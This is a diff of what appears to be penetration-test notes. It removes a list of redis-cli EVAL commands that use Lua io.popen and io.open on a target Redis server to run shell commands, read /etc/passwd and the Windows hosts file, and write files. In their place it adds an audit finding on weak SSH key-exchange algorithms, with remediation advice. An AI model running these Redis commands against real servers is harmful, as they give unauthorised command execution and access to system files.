@@ -1,12 +1,10 @@
-redis-cli -h <REDIS_IP> -p <PORT> EVAL "local f = io.popen('ls -la /'); local r = f:read('*a'); f:close(); return r" 0
+The remote SSH server was configured to allow key exchange algorithms that were considered weak according to the IETF draft document Key Exchange (KEX) Method Updates and Recommendations for Secure Shell (SSH) (RFC 9142, Section 4). 
 
-redis-cli -h <REDIS_IP> -p <PORT> EVAL "local f = io.open('/etc/passwd', 'r'); if f then local r = f:read('*a'); f:close(); return r else return 'Cannot open file' end" 0
+Impact:
+The presence of weak key exchange algorithms could have made SSH connections vulnerable to cryptographic attacks, including man-in-the-middle attacks and potential decryption of encrypted communication. This could have compromised the confidentiality and integrity of data transmitted over SSH.
 
-redis-cli -h <REDIS_IP> -p <PORT> EVAL "local f = io.open('/tmp/test.txt', 'w'); f:write('Hello from Redis!'); f:close(); return 'File written successfully'" 0
+Recommendation:
+It is recommended to disable the weak key exchange algorithms and configure the SSH server to use only secure, modern alternatives as outlined in RFC 9142. System administrators should review product documentation or contact the vendor for guidance on disabling these algorithms. Regular security audits should be conducted to ensure compliance with best practices.
 
-redis-cli -h <REDIS_IP> -p <PORT> EVAL "local f = io.popen('dir C:\\'); local r = f:read('*a'); f:close(); return r" 0
 
-redis-cli -h <REDIS_IP> -p <PORT> EVAL "local f = io.open('C:\\Windows\\System32\\drivers\\etc\\hosts', 'r'); if f then local r = f:read('*a'); f:close(); return r else return 'Cannot open file' end" 0
-redis-cli -h <REDIS_IP> -p <PORT> EVAL "local f = io.open('C:\\temp\\test.txt', 'w'); f:write('Hello from Redis!'); f:close(); return 'File written successfully'" 0
-
-redis-cli -h <REDIS_IP> -p <PORT> EVAL "return package.path" 0
+It is recommended to replace these weak algorithms with stronger alternatives such as curve25519-sha256, diffie-hellman-group14-sha256, or ecdsa-sha2-nistp256.
